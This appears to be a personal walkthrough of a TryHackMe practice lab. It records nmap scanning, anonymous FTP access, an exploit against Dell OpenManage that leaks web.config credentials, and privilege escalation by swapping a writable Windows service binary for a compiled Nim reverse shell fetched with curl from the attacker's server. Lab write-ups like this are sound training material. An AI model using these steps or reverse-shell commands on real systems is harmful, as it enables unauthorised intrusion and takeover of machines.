# ip addr `10.10.104.127`

# Date 25-05-24 || Rohit Tiwari [13:48]

## PORTS TO TRY

```
============================================
PORT 21 : anonymmous login -- brtueforce -- checkfiles
============================================
PORT 22 : look for cred , bruteforce hydra

============================================
80 : apache -- check for fuzzing,source code and robo.txt

=============================================
8085: CMS--fuzzing--source code and robo.txt
=============================================
3389 RPC:
```

# NMAP scan
```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Hack_smater_10.10.104.127]
└─$ sudo nmap -sVC -v -A $ip -T4 -oN hacker_nmap_scan

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
|_06-28-23  03:00PM              1022126 stolen-passport.png
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 0d:fa:da:de:c9:dd:99:8d:2e:8e:eb:3b:93:ff:e2:6c (RSA)
|   256 5d:0c:df:32:26:d3:71:a2:8e:6e:9a:1c:43:fc:1a:03 (ECDSA)
|_  256 c4:25:e7:09:d6:c9:d9:86:5f:6e:8a:8b:ec:13:4a:8b (ED25519)
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: HackSmarterSec
|_http-server-header: Microsoft-IIS/10.0
1311/tcp open  ssl/rxmon?
| ssl-cert: Subject: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US
| Issuer: commonName=hacksmartersec/organizationName=Dell Inc/stateOrProvinceName=TX/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-06-30T19:03:17
| Not valid after:  2025-06-29T19:03:17
| MD5:   4276:b53d:a8ab:fa7c:10c0:1535:ff41:2928
|_SHA-1: c44f:51f8:ed54:802f:bb94:d0ea:705d:50f8:fd96:f49f
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Sat, 25 May 2024 08:19:56 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|     <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Strict-Transport-Security: max-age=0
|     X-Frame-Options: SAMEORIGIN
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     vary: accept-encoding
|     Content-Type: text/html;charset=UTF-8
|     Date: Sat, 25 May 2024 08:20:03 GMT
|     Connection: close
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
|     <html>
|     <head>
|     <META http-equiv="Content-Type" content="text/html; charset=UTF-8">
|     <title>OpenManage&trade;</title>
|     <link type="text/css" rel="stylesheet" href="/oma/css/loginmaster.css">
|     <style type="text/css"></style>
|_    <script type="text/javascript" src="/oma/js/prototype.js" language="javascript"></script><script type="text/javascript" src="/oma/js/gnavbar.js" language="javascript"></script><script type="text/javascript" src="/oma/js/Clarity.js" language="javascript"></script><script language="javascript">
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-05-25T08:20:32+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=hacksmartersec
| Issuer: commonName=hacksmartersec
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-24T08:13:52
| Not valid after:  2024-11-23T08:13:52
| MD5:   432f:d775:8ba8:ea34:4462:68ba:a5d8:e043
|_SHA-1: fe75:59ad:f064:8194:18bf:bfc2:a4b3:4b9a:ac45:b3c3
| rdp-ntlm-info: 
|   Target_Name: HACKSMARTERSEC
|   NetBIOS_Domain_Name: HACKSMARTERSEC
|   NetBIOS_Computer_Name: HACKSMARTERSEC
|   DNS_Domain_Name: hacksmartersec
|   DNS_Computer_Name: hacksmartersec
|   Product_Version: 10.0.17763
|_  System_Time: 2024-05-25T08:20:27+00:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1311-TCP:V=7.94SVN%T=SSL%I=7%D=5/25%Time=66519F2D%P=x86_64-pc-linux
SF:-gnu%r(GetRequest,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Securi
SF:ty:\x20max-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Op
SF:tions:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20
SF:accept-encoding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x2
SF:0Sat,\x2025\x20May\x202024\x2008:19:56\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20
SF:Strict//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\
SF:">\r\n<html>\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20conte
SF:nt=\"text/html;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>
SF:\r\n<link\x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css
SF:/loginmaster\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script
SF:\x20type=\"text/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20langua
SF:ge=\"javascript\"></script><script\x20type=\"text/javascript\"\x20src=\
SF:"/oma/js/gnavbar\.js\"\x20language=\"javascript\"></script><script\x20t
SF:ype=\"text/javascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"ja
SF:vascript\"></script><script\x20language=\"javascript\">\r\n\x20")%r(HTT
SF:POptions,1089,"HTTP/1\.1\x20200\x20\r\nStrict-Transport-Security:\x20ma
SF:x-age=0\r\nX-Frame-Options:\x20SAMEORIGIN\r\nX-Content-Type-Options:\x2
SF:0nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nvary:\x20accept-en
SF:coding\r\nContent-Type:\x20text/html;charset=UTF-8\r\nDate:\x20Sat,\x20
SF:25\x20May\x202024\x2008:20:03\x20GMT\r\nConnection:\x20close\r\n\r\n<!D
SF:OCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\.0\x20Strict//E
SF:N\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-strict\.dtd\">\r\n<ht
SF:ml>\r\n<head>\r\n<META\x20http-equiv=\"Content-Type\"\x20content=\"text
SF:/html;\x20charset=UTF-8\">\r\n<title>OpenManage&trade;</title>\r\n<link
SF:\x20type=\"text/css\"\x20rel=\"stylesheet\"\x20href=\"/oma/css/loginmas
SF:ter\.css\">\r\n<style\x20type=\"text/css\"></style>\r\n<script\x20type=
SF:\"text/javascript\"\x20src=\"/oma/js/prototype\.js\"\x20language=\"java
SF:script\"></script><script\x20type=\"text/javascript\"\x20src=\"/oma/js/
SF:gnavbar\.js\"\x20language=\"javascript\"></script><script\x20type=\"tex
SF:t/javascript\"\x20src=\"/oma/js/Clarity\.js\"\x20language=\"javascript\
SF:"></script><script\x20language=\"javascript\">\r\n\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# FTP
>Got anonymous login found some text & and a png 

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Hack_smater_10.10.104.127]
└─$ ftp $ip                  
Connected to 10.10.104.127.
220 Microsoft FTP Service
Name (10.10.104.127:dedrknex): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49735|)
125 Data connection already open; Transfer starting.
06-28-23  02:58PM                 3722 Credit-Cards-We-Pwned.txt
06-28-23  03:00PM              1022126 stolen-passport.png
226 Transfer complete.
ftp> mget *
mget Credit-Cards-We-Pwned.txt [anpqy?]? 
229 Entering Extended Passive Mode (|||49737|)
125 Data connection already open; Transfer starting.
100% |***********************************************************|  3722       13.25 KiB/s    00:00 ETA
226 Transfer complete.
3722 bytes received in 00:00 (13.24 KiB/s)
mget stolen-passport.png [anpqy?]? 
229 Entering Extended Passive Mode (|||49738|)
125 Data connection already open; Transfer starting.
 34% |********************                                       |   339 KiB  339.41 KiB/s    00:01 ETAftp: Reading from network: Interrupted system call
  0% |                                                           |    -1        0.00 KiB/s    --:-- ETA
550 The specified network name is no longer available. 
WARNING! 1386 bare linefeeds received in ASCII mode.

```

> The cred.txt contains some random cards detail and used `binwalk` to check for hidden data in png found one zlib data

```bash
──(dedrknex㉿kali)-[~/oscp/Tryhackme/Hack_smater_10.10.104.127]
└─$ binwalk stolen-passport.png   

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
80            0x50            Zlib compressed data, default compression
```
>extracted it

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Hack_smater_10.10.104.127]
└─$ binwalk -e stolen-passport.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
80            0x50            Zlib compressed data, default compression                    
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Hack_smater_10.10.104.127/_stolen-passport.png.extracted]
└─$ ls
50  50.zlib
```

# PORT 80

> okay on port 80 found a cool website 

![](Attachments/Pasted%20image%2020240525140940.png)

`running on microsof IIIS sever 10.0`

# port 1311

got a exploit run and got shell

![](Attachments/Pasted%20image%2020240525144647.png)

>Tried looking for web.conf found  a id and passwd for ssh

```bash
┌──(dedrknex㉿kali)-[~/oscp/Tryhackme/Hack_smater_10.10.104.127]
└─$ python exploit.py 10.9.237.141 $ip:1311 
[-] No server.pem certificate file found. Generating one...
...+.+...+..+...+...+.......+++++++++++++++++++++++++++++++++++++++*.+......+...+..........+.....+.............+..+.+...............+++++++++++++++++++++++++++++++++++++++*......+.+........+.+.....+.+...+..+.+........+......+...................+..+.........+......+....+...........+.........+....+.....+......+....+.........+...+.....+....+..................+...+..+.+..+............+..........+.....+......+.+......+..+..................+...+.+........+...+...+....+...+.....+..........+..+.++++++
.....+......+.+...+.........+...+...+......+...+..+......+....+......+...+..+...+.+...+++++++++++++++++++++++++++++++++++++++*.+...+...+.+...+.....+......+++++++++++++++++++++++++++++++++++++++*...+...........+...+...+....+..............+...................+...+...+...........+...+..........+........+...+....+.....+.+.....+......+.........+.+...+..+.+...............+.....+.........+.............+.....+.......+...++++++
-----
Session: E827F398AF4BCCFCFA33CF7C9332649A
VID: C036B7F4DB73A4AB
file > C:\inetpub\wwwroot\hacksmartersec\web.config
Reading contents of C:\inetpub\wwwroot\hacksmartersec\web.config:
<configuration>
  <appSettings>
    <add key="Username" value="tyler" />
    <add key="Password" value="IAmA1337h4x0randIkn0wit!" />
  </appSettings>
  <location path="web.config">
    <system.webServer>
      <security>
        <authorization>
          <deny users="*" />
        </authorization>
      </security>
    </system.webServer>
  </location>
</configuration>

```

Logged into shh

# Privsec
> For privsec run PrivsecCheck.ps1

```bash
PS C:\Users\tyler\Desktop> powershell -ep bypass -c “. .\PrivescCheck.ps1; Invoke-PrivescCheck”      
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓ 
┃ CATEGORY ┃ TA0043 - Reconnaissance                           ┃ 
┃ NAME     ┃ User identity                                     ┃ 
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫ 
┃ Get information about the current user (name, domain name)   ┃ 
┃ and its access token (SID, integrity level, authentication   ┃ 
┃ ID).                                                         ┃ 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ 
[*] Status: Informational


Name             : HACKSMARTERSEC\tyler
SID              : S-1-5-21-1966530601-3185510712-10604624-1008 
IntegrityLevel   : Medium Mandatory Level (S-1-16-8192)
SessionId        : 0
TokenId          : 00000000-002d14d2
AuthenticationId : 00000000-0021e278
OriginId         : 00000000-000003e7
ModifiedId       : 00000000-0021e29c
Source           : Advapi (00000000-0021e260)

```

Fond on sid vlunerable from privescCheck

![](Attachments/Pasted%20image%2020240525151742.png)

> Alright so spoofer-scheduler is a binary file that exist on target machine which is same as like cron job in linux it has binary file that has read and write perm and can be used to lervarge our right or access to the machine

`Step to get Privsec`

1. First stop the program in target machine by `sc stop spoofer-scheduler` 
2. Then `git clone https://github.com/Sn1r/Nim-Reverse-Shell.git`
3. Then use any text editor and change the ip and port number to the atttacker machine 
4. compile the program `nim c -d:mingw --app:gui rev_shell.nim` will get .exe file and remane the file to spoofer-scheduler.exe
5. move to the location where spoofer-scheduler file exist in target machine 
6. create a local python server in attacker machine where compiler exe exist and then
7. `curl http://10.9.237.141:80/spoofer-scheduler.exe -o spoofer-scheduler.exe`
8. start a nc listner in attacker machine and then on target machine `sc start spoofer-scheduler`
9. got a shell with admin privilage

![](Attachments/Pasted%20image%2020240601130127.png)
![](Attachments/Pasted%20image%2020240601130802.png)
